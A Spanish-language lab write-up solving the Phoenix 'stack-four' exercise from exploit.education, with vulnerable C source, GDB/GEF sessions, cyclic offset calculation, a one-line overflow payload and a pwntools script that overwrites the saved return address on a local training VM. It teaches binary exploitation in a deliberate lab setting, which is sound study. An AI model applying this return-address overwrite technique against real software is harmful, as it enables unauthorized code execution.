---
layout: single
title: "Stack Four"
permalink: /pwn/phoenix/stack-four/
parent: Phoenix
comments: true
excerpt: "Stack Four"
classes: wide
header:
  teaser: /assets/images/2025-08-17-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---

![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)

En este nivel se introduce el concepto de **sobrescritura del puntero de instrucción guardado** (saved return address) mediante un **desbordamiento de buffer estándar**.  
El objetivo es modificar la dirección de retorno de la función `start_level()` para que apunte a `complete_level()` y así ejecutar la función de éxito.

**Consejos:**

- El puntero de instrucción guardado no necesariamente se encuentra justo después de las variables locales: factores como el **relleno del compilador** pueden modificar su ubicación.  
- Algunas arquitecturas pueden no guardar la dirección de retorno en la pila en todos los casos. Más info: [Link register](https://en.wikipedia.org/wiki/Link_register).  
- GDB permite redirigir la entrada de un archivo con `run < my_file`

## Análisis del código

El programa contiene:

- Un **buffer de 64 bytes** (`buffer`) donde se almacena la entrada del usuario.  
- Uso de `gets()`, que permite escribir más allá del buffer y sobrescribir la pila.  
- La función `complete_level()`, que imprime el mensaje de éxito y termina el programa.  



```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the banana split.
 */

#include <err.h>     // Para funciones de manejo de errores
#include <stdio.h>   // Para funciones de entrada/salida estándar (printf, gets)
#include <stdlib.h>  // Para funciones estándar de la biblioteca como exit()
#include <string.h>  // Para funciones de manipulación de cadenas
#include <unistd.h>  // Para funciones del sistema POSIX

// Definimos un banner para que se muestre al inicio del programa
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

// Declaramos la función `gets` que permite leer una entrada del usuario
// (Nota: `gets` es insegura y está obsoleta, pero se usa aquí para propósitos de explotación)
char *gets(char *);

// Función que se ejecutará al completar el nivel exitosamente
void complete_level() {
  // Imprime un mensaje de éxito
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  // Finaliza el programa exitosamente
  exit(0);
}

// Función que contiene la lógica principal del nivel
void start_level() {
  // Declara un buffer de 64 bytes para almacenar la entrada del usuario
  char buffer[64];
  // Variable para almacenar la dirección de retorno del programa
  void *ret;

  // Lee la entrada del usuario y la almacena en el buffer
  gets(buffer);

  // Obtiene la dirección de retorno actual usando una función interna del compilador
  ret = __builtin_return_address(0);
  // Imprime la dirección de retorno a la que volverá el programa
  printf("and will be returning to %p\n", ret);
}

// Función principal que inicia el programa
int main(int argc, char **argv) {
  // Imprime el banner inicial del nivel
  printf("%s\n", BANNER);
  // Llama a la función `start_level` para ejecutar la lógica del nivel
  start_level();
}
```

El reto consiste en sobrescribir la dirección de retorno de start_level() para redirigir la ejecución hacia complete_level().


```c
user@phoenix-amd64:/opt/phoenix/amd64$ gdb ./stack-four 
GNU gdb (GDB) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./stack-four...(no debugging symbols found)...done.
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  printf@plt
0x0000000000400470  gets@plt
0x0000000000400480  puts@plt
0x0000000000400490  exit@plt
0x00000000004004a0  __libc_start_main@plt
0x00000000004004b0  _start
0x00000000004004c6  _start_c
0x00000000004004f0  deregister_tm_clones
0x0000000000400520  register_tm_clones
0x0000000000400560  __do_global_dtors_aux
0x00000000004005f0  frame_dummy
0x000000000040061d  complete_level
0x0000000000400635  start_level
0x000000000040066a  main
0x00000000004006a0  __do_global_ctors_aux
0x00000000004006e2  _fini
gef➤ 
```

**Determinación de offset con cyclic**

Hacemos un breakpoint en main y ejecutamos el programa: para esto ejecutamos los comandos `break main` y luego el comando `r` para ejecutarlo

```c
gef➤  break main
Breakpoint 1 at 0x40066e
gef➤  r
Starting program: /opt/phoenix/amd64/stack-four 

Breakpoint 1, 0x000000000040066e in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffe6a8  →  0x00007fffffffe8a0  →  "/opt/phoenix/amd64/stack-four"
$rcx   : 0x0               
$rdx   : 0x00007fffffffe6b8  →  0x00007fffffffe8be  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$rsp   : 0x00007fffffffe650  →  0x0000000000000001
$rbp   : 0x00007fffffffe650  →  0x0000000000000001
$rsi   : 0x00007fffffffe6a8  →  0x00007fffffffe8a0  →  "/opt/phoenix/amd64/stack-four"
$rdi   : 0x1               
$rip   : 0x000000000040066e  →  <main+4> sub rsp, 0x10
$r8    : 0x00000000004006e2  →  <_fini+0> push rax
$r9    : 0x0               
$r10   : 0x00007ffff7dfa767  →  0x4c00636f6c6c616d ("malloc"?)
$r11   : 0x00007ffff7ffd9e0  →  0x00007ffff7d6b000  →  0x00010102464c457f
$r12   : 0x00007fffffffe6b8  →  0x00007fffffffe8be  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040066a  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe650│+0x0000: 0x0000000000000001	 ← $rsp, $rbp
0x00007fffffffe658│+0x0008: 0x00007ffff7d8fd62  →  <__libc_start_main+54> mov edi, eax
0x00007fffffffe660│+0x0010: 0x0000000000000000
0x00007fffffffe668│+0x0018: 0x00007fffffffe6a0  →  0x0000000000000001
0x00007fffffffe670│+0x0020: 0x0000000000000000
0x00007fffffffe678│+0x0028: 0x00007ffff7ffdbc8  →  0x00007ffff7ffdbc8  →  [loop detected]
0x00007fffffffe680│+0x0030: 0x0400000100003e00
0x00007fffffffe688│+0x0038: 0x00000000004004e9  →   nop DWORD PTR [rax+0x0]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400665 <start_level+48> (bad)  
     0x400666 <start_level+49> call   QWORD PTR [rax+0x4855c3c9]
     0x40066c <main+2>         mov    ebp, esp
 →   0x40066e <main+4>         sub    rsp, 0x10
     0x400672 <main+8>         mov    DWORD PTR [rbp-0x4], edi
     0x400675 <main+11>        mov    QWORD PTR [rbp-0x10], rsi
     0x400679 <main+15>        mov    edi, 0x400750
     0x40067e <main+20>        call   0x400480 <puts@plt>
     0x400683 <main+25>        mov    eax, 0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-four", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40066e → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Ejecutamos el comando `c` para continuar 

```c
gef➤  c
Continuing.
Welcome to phoenix/stack-four, brought to you by https://exploit.education
```

Enviamos un patrón cíclico de 100 bytes: con el comando `pwn cyclic 100` en nuestra máquina local

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix]
└─# pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

El resultado que nos da lo pegamos como la respuesta que está esperando el binario 

```c
gef➤  c
Continuing.
Welcome to phoenix/stack-four, brought to you by https://exploit.education
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
and will be returning to 0x6161617861616177

Program received signal SIGSEGV, Segmentation fault.
0x6161617861616177 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x2c              
$rbx   : 0x00007fffffffe6a8  →  0x00007fffffffe8a0  →  "/opt/phoenix/amd64/stack-four"
$rcx   : 0x0               
$rdx   : 0xffffffff        
$rsp   : 0x00007fffffffe640  →  0x0000000061616179 ("yaaa"?)
$rbp   : 0x6161617661616175 ("uaaavaaa"?)
$rsi   : 0x000000000040074f  →   add BYTE PTR [rdi+0x65], dl
$rdi   : 0x00007ffff7ffc948  →  "and will be returning to 0x6161617861616177ou by h[...]"
$rip   : 0x6161617861616177 ("waaaxaaa"?)
$r8    : 0x2000            
$r9    : 0x10              
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffe6b8  →  0x00007fffffffe8be  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040066a  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe640│+0x0000: 0x0000000061616179 ("yaaa"?)	 ← $rsp
0x00007fffffffe648│+0x0008: 0x0000000100000000
0x00007fffffffe650│+0x0010: 0x0000000000000001
0x00007fffffffe658│+0x0018: 0x00007ffff7d8fd62  →  <__libc_start_main+54> mov edi, eax
0x00007fffffffe660│+0x0020: 0x0000000000000000
0x00007fffffffe668│+0x0028: 0x00007fffffffe6a0  →  0x0000000000000001
0x00007fffffffe670│+0x0030: 0x0000000000000000
0x00007fffffffe678│+0x0038: 0x00007ffff7ffdbc8  →  0x00007ffff7ffdbc8  →  [loop detected]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161617861616177
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-four", stopped, reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

con el comando `info frame` podemos ver el valor del rip que en este caso es  rip = 0x6161617861616177

```c
gef➤  info frame
Stack level 0, frame at 0x7fffffffe648:
 rip = 0x6161617861616177; saved rip = 0x61616179
 called by frame at 0x7fffffffe650
 Arglist at 0x7fffffffe638, args: 
 Locals at 0x7fffffffe638, Previous frame's sp is 0x7fffffffe648
 Saved registers:
  rip at 0x7fffffffe640

```


Calculamos el offset donde se sobrescribe el saved return address con el valor que tenemos  

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix]
└─# pwn cyclic -l 0x6161617861616177
88
```

El offset es 88 bytes, es decir, debemos enviar 88 bytes antes de la dirección de complete_level(). 

enviamos el payload y la dirección de complet_level que vimos previamente  **0x000000000040061d  complete_level** pero en little-endian que sería \x1d\x06\x40 y con esto resolvemos el reto.

```c
user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A" * 88 + "\x1d\x06\x40"' | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

**Exploit con Pwntools**

Creamos un script en Python3 para automatizarlo:

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/4_stack-four]
└─# cat Remote_exploit.py 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Remote_exploit.py
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/env python3
   2   │ from pwn import *
   3   │ import time
   4   │ 
   5   │ # Conectar al proceso remoto
   6   │ ssh_connection = ssh(user='user', host='localhost', password='user', port=2222)
   7   │ 
   8   │ # Definir el payload
   9   │ payload = b"A" * 88
  10   │ payload += p64(0x40061d) 
  11   │ 
  12   │ # Ejecutar el programa remoto
  13   │ process = ssh_connection.process('/opt/phoenix/amd64/stack-four')
  14   │ 
  15   │ # Enviar el payload
  16   │ process.sendline(payload)
  17   │ 
  18   │ # Esperar un poco para asegurar que todo se haya enviado
  19   │ time.sleep(1)
  20   │ 
  21   │ # captura la respuesta y la envía
  22   │ flag = process.recvall().decode()
  23   │ log.success("Output: " + flag)
  24   │ 
  25   │ # Cerrar el proceso
  26   │ process.close()
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

**Resultado final**

Se evidencia el mensaje que indica que el reto fue resuelto

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/4_stack-four]
└─# python Remote_exploit.py 
[+] Connecting to localhost on port 2222: Done
[*] user@localhost:
    Distro    Unknown 
    OS:       linux
    Arch:     amd64
    Version:  4.9.0
    ASLR:     Disabled
    SHSTK:    Disabled
    IBT:      Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Starting remote process None on localhost: pid 406
[!] ASLR is disabled for '/opt/phoenix/amd64/stack-four'!
[+] Receiving all data: Done (176B)
[*] Stopped remote process 'stack-four' on localhost (pid 406)
[+] Output: Welcome to phoenix/stack-four, brought to you by https://exploit.education
    and will be returning to 0x40061d
    **Congratulations, you've finished phoenix/stack-four :-) Well done!**
```

**Conclusión**

En este reto vimos cómo sobrescribir la dirección de retorno permite redirigir el flujo de ejecución del programa hacia una función deseada.

Puntos clave:

  - El uso de funciones inseguras como gets() facilita el buffer overflow.

  - El saved return address es un objetivo clásico en explotación de la pila.

  - Controlar el flujo mediante este puntero es una técnica fundamental en explotación binaria.